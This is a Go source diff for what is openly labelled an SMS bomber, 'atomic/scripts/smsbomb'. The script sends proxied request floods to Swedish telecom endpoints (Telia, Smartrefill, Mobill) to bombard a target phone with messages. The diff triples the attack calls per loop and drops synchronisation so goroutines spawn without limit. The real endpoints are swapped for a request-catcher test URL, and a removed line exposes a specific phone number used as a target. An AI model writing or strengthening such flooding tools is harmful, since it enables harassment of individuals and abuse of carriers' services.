@@ -8,7 +8,6 @@ import (
 	"net/http"
 	"strconv"
 	"strings"
-	"sync"
 	"time"
 
 	"github.com/valyala/fasthttp"
@@ -22,7 +21,9 @@ func main() {
 	fmt.Println("loading sms :: atomic/scripts/smsbomb")
 	for {
 		StartALL()
-		time.Sleep(time.Microsecond * 1)
+		StartALL()
+		StartALL()
+		time.Sleep(time.Millisecond * 1)
 	}
 }
 
@@ -45,18 +46,20 @@ func fetchProxies(uri string) []string {
 }
 
 func StartALL() {
-	var wg sync.WaitGroup // New wait group
-	wg.Add(3)             // Using two goroutines
 
-	go Telia1(&wg)
-	go Laddkod(&wg)
-	go ProdMobil2(&wg)
-
+	go func() {
+		Telia1()
+	}()
+	go func() {
+		ProdMobil2()
+	}()
+	go func() {
+		Laddkod()
+	}()
 }
-func Telia1(wg *sync.WaitGroup) {
-	defer wg.Done()
+func Telia1() {
 
-	url := "https://sa.telia.se/se/rs/users/msisdn" // Replace with your API endpoint
+	url := "https://wew.requestcatcher.com/" // Replace with your API endpoint
 
 	proxy := proxyList[rand.Intn(len(proxyList))]
 
@@ -98,10 +101,9 @@ func Telia1(wg *sync.WaitGroup) {
 	}
 
 }
-func Laddkod(wg *sync.WaitGroup) {
-	defer wg.Done()
+func Laddkod() {
 
-	url := "https://teliase.smartrefill.se/Refill/api/TELIA/v1/passwords/0706505038" // Replace with your API endpoint
+	url := "https://wew.requestcatcher.com/" // Replace with your API endpoint
 
 	proxy := proxyList[rand.Intn(len(proxyList))]
 
@@ -139,10 +141,9 @@ func Laddkod(wg *sync.WaitGroup) {
 
 	}
 }
-func ProdMobil2(wg *sync.WaitGroup) {
-	defer wg.Done()
+func ProdMobil2() {
 
-	url := "https://prod2.mobill.se/mspRequest" // Replace with your API endpoint
+	url := "https://wew.requestcatcher.com/" // Replace with your API endpoint
 
 	proxy := proxyList[rand.Intn(len(proxyList))]
 
